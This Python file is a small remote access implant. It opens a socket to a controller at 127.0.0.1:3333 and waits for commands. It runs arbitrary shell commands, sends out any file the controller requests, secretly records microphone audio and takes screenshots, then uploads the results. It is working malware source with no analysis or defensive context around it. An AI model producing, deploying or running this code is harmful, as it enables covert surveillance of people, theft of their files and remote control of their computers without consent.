import os
import wavio
import socket
import random
import pyautogui
import subprocess
import sounddevice

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 3333))

# flags
SSCS = "<SCCS>"
FILE = "<FILE>"
ERRO = "<ERRO>"

def changes_dir(x):  # changes working dir
    try:
        os.chdir(x)
        sock.send(SSCS.encode())
    except:
        sock.send(ERRO.encode())

def upload_file(x):  # upload file
    try:
        with open(x, "rb") as file:
            data = file.read()
            file.close()
            
        sock.send(FILE.encode())
        sock.send(x.encode())
        sock.send(data)
    except:
        sock.send(ERRO.encode())

def execute_cmd(x):  # executes commands on shell
    output = subprocess.getoutput(x)
    if output == "":
        sock.send(SSCS.encode())
    else:
        sock.send(output.encode())

def record_audio(x):
    try:
        a = int(x)
        time = a
        rate = 44100
        name = f"{random.randint(1, 1000)}.wav"

        audio_data = sounddevice.rec(int(rate * time), samplerate=rate, channels=1)
        sounddevice.wait()
        wavio.write(name, audio_data, rate, sampwidth=2)

        upload_file(name)
    except:
        sock.send(ERRO.encode())

def screenshot():    # function to capture screenshot
    try:
        scrn = pyautogui.screenshot()
        name = f"{random.randint(1,1000)}.jpeg"
        scrn.save(name)
        
        upload_file(name)
    except:
        sock.send(ERRO.encode())

while True:
    response = sock.recv(1024).decode()
    commands = response.split()

    match commands[0]:
        case "cd":
            changes_dir(commands[1])
        case "download":
            upload_file(commands[1])
        case "record":
            record_audio(commands[1])
        case "screenshot":
            screenshot()
        case _:
            execute_cmd(commands)